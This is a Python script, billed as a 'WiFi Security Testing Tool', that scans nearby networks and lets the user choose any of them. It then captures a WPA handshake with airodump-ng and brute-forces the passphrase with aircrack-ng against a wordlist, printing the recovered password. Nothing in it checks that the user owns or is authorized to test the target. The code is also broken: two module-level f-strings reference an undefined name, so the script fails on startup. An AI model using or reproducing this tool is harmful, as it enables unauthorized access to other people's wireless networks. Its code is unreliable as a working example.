#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#   Air_wifi_craker  -  WiFi Security Testing Tool
#   Python 3 - single file
#   Requires: aircrack-ng, iw, nmcli (Linux), root privileges
# ============================================================

import os
import re
import shutil
import signal
import subprocess
import sys
import time

TOOL_NAME = "Air_wifi_craker"
USER_NAME = f"senpai@{Air_craker_wifi}"
CAP_FILE = f"/tmp/{Air_craker_wifi}_cap"


def banner():
    print("\033[2J\033[H", end="")
    print()
    print("\033[1;36m")
    print("  █████╗ ██╗██████╗     ██╗    ██╗███████╗███████╗██╗    ██╗")
    print(" ██╔══██╗██║██╔══██╗    ██║    ██║██╔════╝██╔════╝██║    ██║")
    print(" ███████║██║██████╔╝    ██║ █╗ ██║█████╗  █████╗  ██║ █╗ ██║")
    print(" ██╔══██║██║██╔═══╝     ██║███╗██║██╔══╝  ██╔══╝  ██║███╗██║")
    print(" ██║  ██║██║██║         ╚███╔███╔╝███████╗███████╗╚███╔███╔╝")
    print(" ╚═╝  ╚═╝╚═╝╚═╝          ╚══╝╚══╝ ╚══════╝╚══════╝ ╚══╝╚══╝ ")
    print("                C R A K E R   v1.0\033[0m")
    print()


def run(cmd, quiet=True):
    """Run a shell command, optionally capturing stdout."""
    try:
        r = subprocess.run(cmd, shell=True,
                           stdout=subprocess.PIPE if quiet else None,
                           stderr=subprocess.DEVNULL if quiet else None,
                           text=True)
        return r.stdout or ""
    except Exception:
        return ""


def check_dependencies():
    missing = [t for t in ("aircrack-ng", "airodump-ng", "iw", "nmcli") if not shutil.which(t)]
    if missing:
        print(f"[!] Missing tools: {', '.join(missing)}")
        print("    Install with: sudo apt install aircrack-ng network-manager wireless-tools")
        sys.exit(1)


def detect_interface():
    out = run("iw dev | awk '/Interface/{print $2; exit}'")
    return out.strip()


def scan_networks():
    """Scan networks using nmcli and return a list of dicts."""
    raw = run("nmcli -t -f IN-USE,BSSID,SSID,CHAN,SIGNAL,SECURITY dev wifi list")
    nets = []
    for line in raw.splitlines():
        if not line.strip():
            continue
        f = line.split(":")
        if len(f) < 6:
            continue
        bssid = f[1]
        chan, signal, sec = f[-3], f[-2], f[-1]
        ssid = ":".join(f[2:-3])  # SSID may contain colons
        nets.append({
            "bssid": bssid,
            "essid": ssid if ssid else "<hidden>",
            "channel": chan or "1",
            "signal": int(signal) if signal.isdigit() else 0,
            "security": sec if sec else "OPEN",
        })
    nets.sort(key=lambda n: -n["signal"])
    return nets


def set_monitor(iface):
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set monitor none")
    run(f"ip link set {iface} up")


def set_managed(iface):
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type managed")
    run(f"ip link set {iface} up")
    run(f"service network-manager restart")


def crack_network(iface, target, wordlist):
    if os.path.exists(f"{CAP_FILE}-01.cap"):
        os.remove(f"{CAP_FILE}-01.cap")

    print(f"\n[*] Target  : {target['essid']} ({target['bssid']})")
    print(f"[*] Channel : {target['channel']}")
    print("[*] Waiting for handshake capture (needs client traffic)...")
    print("[*] Press Ctrl+C to abort capture early.\n")

    set_monitor(iface)
    try:
        subprocess.run(
            ["airodump-ng", "-c", target["channel"], "--bssid", target["bssid"],
             "-w", CAP_FILE, iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except KeyboardInterrupt:
        pass
    finally:
        set_managed(iface)

    cap = f"{CAP_FILE}-01.cap"
    if not os.path.exists(cap):
        print("[!] No capture file was produced.")
        return None

    print("[*] Running dictionary attack with aircrack-ng...")
    proc = subprocess.run(
        ["aircrack-ng", "-w", wordlist, "-b", target["bssid"], cap],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

    m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", proc.stdout)
    return m.group(1) if m else None


def main():
    if os.geteuid() != 0:
        print("[!] Run as root: sudo python3 Air_wifi_craker.py")
        sys.exit(1)

    check_dependencies()
    banner()

    iface = detect_interface()
    if not iface:
        print("[!] No wireless interface detected.")
        sys.exit(1)

    print(f"[*] Interface : {iface}")
    print("[*] Scanning for networks...")
    time.sleep(2)

    nets = scan_networks()
    banner()

    print("\033[1;32m")
    print("=" * 70)
    print("                      DETECTED WIFI NETWORKS")
    print("=" * 70)
    print("\033[0m")
    if not nets:
        print("[!] No networks found. Try rescanning.")
    for i, n in enumerate(nets, start=1):
        print(f"  [{i:2d}]  {n['essid']:<28}  CH:{n['channel']:>2}  "
              f"{-100 + n['signal'] // 2:4d} dBm  {n['security']}")
    print("\033[1;32m")
    print("=" * 70)
    print("=" * 70)
    print("\033[0m")

    print(f"\n  \033[1;33muser: {USER_NAME}\033[0m\n")
    try:
        choice = int(input("  Choose a network number to crack (0 = exit): ").strip())
    except (ValueError, EOFError):
        return
    if choice == 0:
        print("\n[*] Bye.")
        return
    if choice < 1 or choice > len(nets):
        print("[!] Invalid selection.")
        sys.exit(1)

    wordlist = input("  Wordlist path [default: /usr/share/wordlists/rockyou.txt]: ").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"
    if not os.path.isfile(wordlist):
        print(f"[!] Wordlist not found: {wordlist}")
        sys.exit(1)

    password = crack_network(iface, nets[choice - 1], wordlist)
    if password:
        print("\n  \033[1;32m[*] Cracked successfully!\033[0m")
        print(f"  \033[1;32mPassword: {password}\033[0m\n")
    else:
        print("\n  \033[1;31m[!] Password not found in wordlist.\033[0m\n")


if __name__ == "__main__":
    main()
    